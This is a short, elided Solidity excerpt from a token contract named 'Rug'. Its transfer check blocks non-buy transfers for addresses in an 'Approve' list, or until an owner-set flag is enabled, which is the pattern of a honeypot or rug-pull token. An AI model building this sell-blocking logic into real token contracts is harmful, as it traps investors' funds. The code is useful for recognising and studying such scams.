...
contract Rug is IERC20, Ownable {
  ...
  function _transfer(
    ...
    if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(uniswapV2Router) && !_isExcludedFromFee[from]) require((enabled && !Approve[from] && amount <= _maxTxAmount), 'Transfer amount exceeds the maxTxAmount.');
